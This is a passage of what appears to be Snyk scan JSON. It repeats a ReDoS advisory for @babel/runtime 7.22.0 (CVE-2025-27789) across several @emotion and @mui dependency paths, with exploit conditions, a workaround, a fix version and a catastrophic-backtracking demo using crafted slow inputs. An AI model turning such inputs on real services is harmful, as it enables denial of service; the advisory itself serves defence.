        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/lab@5.0.0-alpha.131",
          "@mui/base@5.0.0-beta.2",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "@mui/base@5.0.0-beta.2",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.16.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
